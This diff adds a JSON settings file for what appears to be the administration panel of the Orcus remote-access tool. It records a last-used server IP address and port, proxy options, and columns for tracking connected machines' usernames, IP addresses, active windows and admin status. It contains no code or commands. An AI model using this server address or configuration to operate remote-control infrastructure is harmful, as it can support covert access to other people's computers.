@@ -1,0 +1,44 @@
+{
+  "LastServerIp": "185.62.189.108",
+  "LastServerPort": 10134,
+  "Language": {
+    "Uri": "/Resources/Languages/OrcusAdministration.en-us.xaml",
+    "Culture": null
+  },
+  "Theme": 1,
+  "DefaultListGroupBy": 0,
+  "DefaultListColumnData": {
+    "Order": [
+      "online",
+      "username",
+      "ipaddress",
+      "id",
+      "ostype",
+      "version",
+      "activewindow",
+      "administrator",
+      "service",
+      "country",
+      "language"
+    ],
+    "Visible": [
+      "online",
+      "username",
+      "ipaddress",
+      "id",
+      "ostype",
+      "country"
+    ]
+  },
+  "AccentColor": "Blue",
+  "EnabledPlugins": [],
+  "LoadCommandViewDataAutomatically": true,
+  "UseProxyToConnectToServer": false,
+  "ProxyType": 2,
+  "ProxyIpAddress": null,
+  "ProxyPort": 1080,
+  "ProxyAuthenticate": false,
+  "ProxyUsername": null,
+  "ProxyPassword": null,
+  "IsConsoleAtTop": false
+}
